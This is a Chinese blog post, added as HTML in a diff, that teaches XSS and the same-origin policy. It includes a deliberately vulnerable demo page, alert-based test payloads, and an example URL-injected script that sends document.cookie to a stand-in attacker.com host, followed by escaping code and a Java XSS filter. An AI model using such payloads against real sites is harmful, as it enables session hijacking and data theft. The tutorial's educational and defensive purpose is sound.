@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="凌冬">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="XSSxss介绍跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。 攻击原理攻击者通过注入恶意脚本，使其在用户浏览器中执行。这种攻击可以用于盗取用户的信息、会话令牌等，或者劫持流量实现恶意跳转。 该漏洞在客户端和服务器端都会发生，所以均要进行防护操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS、同源策略和CSRF">
+<meta property="og:url" content="https://hukaichao.me/2023/12/21/XSS%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8CCSRF/index.html">
+<meta property="og:site_name" content="凌冬的个人博客">
+<meta property="og:description" content="XSSxss介绍跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。 攻击原理攻击者通过注入恶意脚本，使其在用户浏览器中执行。这种攻击可以用于盗取用户的信息、会话令牌等，或者劫持流量实现恶意跳转。 该漏洞在客户端和服务器端都会发生，所以均要进行防护操作。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-21T08:42:42.000Z">
+<meta property="article:modified_time" content="2024-02-02T07:27:40.293Z">
+<meta property="article:author" content="凌冬">
+<meta property="article:tag" content="java学习">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>XSS、同源策略和CSRF - 凌冬的个人博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"hukaichao.me","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="XSS、同源策略和CSRF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-21 16:42" pubdate>
+          2023年12月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">XSS、同源策略和CSRF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h2><p><strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5">代码注入</a>的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者通过注入恶意脚本，使其在用户浏览器中执行。这种攻击可以用于盗取用户的信息、会话令牌等，或者劫持流量实现恶意跳转。</p>
+<p>该漏洞在客户端和服务器端都会发生，所以均要进行防护操作。</p>
+<p>简单的代码示例（该示例是仅在客户端进行攻击）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Unsecured Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to our website!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 用户输入的文本框 --&gt;</span><br><span class="line">    &lt;label for=&quot;userInput&quot;&gt;Enter your input:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;userInput&quot;&gt;</span><br><span class="line">    &lt;button onclick=&quot;displayUserInput()&quot;&gt;Display Input&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 用户输入直接显示在页面上的区域，没有进行防御 --&gt;</span><br><span class="line">    &lt;div id=&quot;user-content&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function displayUserInput() &#123;</span><br><span class="line">            // 获取用户输入</span><br><span class="line">            var userInput = document.getElementById(&#x27;userInput&#x27;).value;</span><br><span class="line"></span><br><span class="line">            // 直接将用户输入插入到页面上，没有经过转义</span><br><span class="line">            var userContentDiv = document.getElementById(&#x27;user-content&#x27;);</span><br><span class="line">            userContentDiv.innerHTML = userInput;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这个页面中，如果在输入框中输入：<code>&lt;img src=&quot;http://888.888.com/999.png&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code>，点击按钮会发现会弹出”XSS”，这便说明该页面存在XSS漏洞。（这里说一下，如果是输入<code>&lt;script&gt;alert(&#39;XSS Attack&#39;);&lt;/script&gt;</code>，将看不到效果，似乎是浏览器会将&lt;s及其之后的内容识别并进行阻止）</p>
+<p>为了避免被攻击，网站应该对用户的输入内容进行转义处理，例如上面的script修改成下面这样的即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function displayUserInput() &#123;</span><br><span class="line">        // 获取用户输入</span><br><span class="line">        var userInput = document.getElementById(&#x27;userInput&#x27;).value;</span><br><span class="line"></span><br><span class="line">        // 对用户输入进行转义</span><br><span class="line">        var div = document.createElement(&#x27;div&#x27;);</span><br><span class="line">        div.appendChild(document.createTextNode(userInput));</span><br><span class="line">        </span><br><span class="line">        // 清空原有内容</span><br><span class="line">        var userContentDiv = document.getElementById(&#x27;user-content&#x27;);</span><br><span class="line">        userContentDiv.innerHTML = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">        // 将处理后的输入显示在页面上</span><br><span class="line">        userContentDiv.appendChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面的示例是发生在客户端中，并且输入的地方是在输入框。在实际攻击的时候很多进行注入的地方不在输入框，而是在url中。那么此时的攻击流程就是这样的：</p>
+<p>攻击者构造一个包含恶意脚本的连接，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.html?input=&lt;script&gt;</span><br><span class="line">  // 恶意脚本，将用户的 Cookie 发送到攻击者的服务器</span><br><span class="line">  var img = new Image();</span><br><span class="line">  img.src = &quot;http://attacker.com/steal.php?cookie=&quot; + document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，攻击者在用户浏览器中注入了一个 <code>&lt;script&gt;</code> 标签，其中的 JavaScript 代码创建了一个图片对象，并将用户的 Cookie 信息附加到一个 URL 中，然后通过 Image 对象的 <code>src</code> 属性来请求这个 URL。这样，当用户点击链接时，恶意脚本将用户的 Cookie 发送到了攻击者控制的服务器上。</p>
+<p>攻击不止会发生在客户端，还会发生在服务端，将脚本保存到数据库中，例如现在有一个网站有留言板或者评论功能，用户可以输入内容然后上传到留言板中，此时有人在留言板中输入<code>&lt;script&gt;alert(“hey!you are attacked”)&lt;/script&gt;</code> 然后上传到服务器中，如果服务器中没有做好XSS攻击防御，那么此时服务器的数据库存储下了这个内容，在其他用户访问的时候展示出来这个内容，展示到浏览器上网页代码就会变形如以下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">       &lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=”board” </span><br><span class="line">        &lt;script&gt;alert(“hey!you are attacked”)&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;     </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么访问的用户就会指定这一段恶意脚本。</p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>避免XSS的方法之一主要是将用户所提供的内容进行过滤，许多语言都有提供对HTML的过滤</p>
+<p>在后端一般通过Filter实现防止XSS攻击的过滤器。</p>
+<p>这里贴上一个过滤器的实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 防止XSS攻击的过滤器</span><br><span class="line"> *</span><br><span class="line"> * @author ruoyi</span><br><span class="line"> */</span><br><span class="line">public class XssFilter implements Filter &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 排除链接</span><br><span class="line">     */</span><br><span class="line">    public List&lt;String&gt; excludes = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        String tempExcludes = filterConfig.getInitParameter(&quot;excludes&quot;);</span><br><span class="line">        if (StringUtils.isNotEmpty(tempExcludes)) &#123;</span><br><span class="line">            String[] url = tempExcludes.split(StringUtils.SEPARATOR);</span><br><span class="line">            for (int i = 0; url != null &amp;&amp; i &lt; url.length; i++) &#123;</span><br><span class="line">                excludes.add(url[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">        throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">        HttpServletResponse resp = (HttpServletResponse) response;</span><br><span class="line">        if (handleExcludeURL(req, resp)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request);</span><br><span class="line">        chain.doFilter(xssRequest, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String url = request.getServletPath();</span><br><span class="line">        String method = request.getMethod();</span><br><span class="line">        // GET DELETE 不过滤</span><br><span class="line">        if (method == null || HttpMethod.GET.matches(method) || HttpMethod.DELETE.matches(method)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return StringUtils.matches(url, excludes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * XSS过滤处理</span><br><span class="line"> *</span><br><span class="line"> * @author ruoyi</span><br><span class="line"> */</span><br><span class="line">public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @param request</span><br><span class="line">     */</span><br><span class="line">    public XssHttpServletRequestWrapper(HttpServletRequest request) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String[] getParameterValues(String name) &#123;</span><br><span class="line">        String[] values = super.getParameterValues(name);</span><br><span class="line">        if (values != null) &#123;</span><br><span class="line">            int length = values.length;</span><br><span class="line">            String[] escapseValues = new String[length];</span><br><span class="line">            for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">                // 防xss攻击和过滤前后空格</span><br><span class="line">                escapseValues[i] = HtmlUtil.cleanHtmlTag(values[i]).trim();</span><br><span class="line">            &#125;</span><br><span class="line">            return escapseValues;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.getParameterValues(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ServletInputStream getInputStream() throws IOException &#123;</span><br><span class="line">        // 非json类型，直接返回</span><br><span class="line">        if (!isJsonRequest()) &#123;</span><br><span class="line">            return super.getInputStream();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 为空，直接返回</span><br><span class="line">        String json = StrUtil.str(IoUtil.readBytes(super.getInputStream(), false), StandardCharsets.UTF_8);</span><br><span class="line">        if (StringUtils.isEmpty(json)) &#123;</span><br><span class="line">            return super.getInputStream();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // xss过滤</span><br><span class="line">        json = HtmlUtil.cleanHtmlTag(json).trim();</span><br><span class="line">        byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">        final ByteArrayInputStream bis = IoUtil.toStream(jsonBytes);</span><br><span class="line">        return new ServletInputStream() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public boolean isFinished() &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public boolean isReady() &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public int available() throws IOException &#123;</span><br><span class="line">                return jsonBytes.length;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void setReadListener(ReadListener readListener) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public int read() throws IOException &#123;</span><br><span class="line">                return bis.read();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 是否是Json请求</span><br><span class="line">     */</span><br><span class="line">    public boolean isJsonRequest() &#123;</span><br><span class="line">        String header = super.getHeader(HttpHeaders.CONTENT_TYPE);</span><br><span class="line">        return StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>上面的代码中有排除链接等配置，需要在application.yml中进行设置，设置内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 防止XSS攻击</span><br><span class="line">xss:</span><br><span class="line">  # 过滤开关</span><br><span class="line">  enabled: true</span><br><span class="line">  # 排除链接（多个用逗号分隔）</span><br><span class="line">  excludes: /system/notice</span><br><span class="line">  # 匹配链接</span><br><span class="line">  urlPatterns: /system/*,/monitor/*,/tool/*</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>上面介绍了XSS攻击，下面会记录CSRF攻击，在写CSRF攻击前，需要了解以下浏览器的同源策略。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>同源策略（英语：Same-origin policy）是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p>
+<p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于HTTP cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p>
+<p>值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷。</p>
+<h2 id="同源策略示例"><a href="#同源策略示例" class="headerlink" title="同源策略示例"></a>同源策略示例</h2><p>下表列出哪些URL与URL <code>http://www.example.com/dir/page.html</code> 属于相同来源：</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="http://www.example.com/dir/page2.html">http://www.example.com/dir/page2.html</a></td>
+<td>是</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://www.example.com/dir2/other.html">http://www.example.com/dir2/other.html</a></td>
+<td>是</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://username:password@www.example.com/dir2/other.html">http://username:password@www.example.com/dir2/other.html</a></td>
+<td>是</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://www.example.com:81/dir/other.html">http://www.example.com:81/dir/other.html</a></td>
+<td>否</td>
+<td>不同端口（若未标明，http:&#x2F;&#x2F; 默认端口号为80）</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.example.com/dir/other.html[%E5%A4%B1%E6%95%88%E9%93%BE%E6%8E%A5]">https://www.example.com/dir/other.html[失效链接]</a></td>
+<td>否</td>
+<td>不同协议（https和http）</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://en.example.com/dir/other.html">http://en.example.com/dir/other.html</a></td>
+<td>否</td>
+<td>不同域名</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://example.com/dir/other.html">http://example.com/dir/other.html</a></td>
+<td>否</td>
+<td>不同域名（需要完全匹配）</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td>
+<td>否</td>
+<td>不同域名（需要完全匹配）</td>
+</tr>
+</tbody></table>
+<h2 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h2><p>最初学习web，在写前后端分离项目的时候遇到了CORS问题，这个问题就和同源策略有关。<br>在前后端分离的情况下，通常前端代码运行在一个独立的域（例如，<a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000</a> ），而后端 API 服务可能运行在另一个域（例如，<a target="_blank" rel="noopener" href="http://localhost:8000/">http://localhost:8000</a> ）。由于这两者的域不同，就涉及到跨域请求。</p>
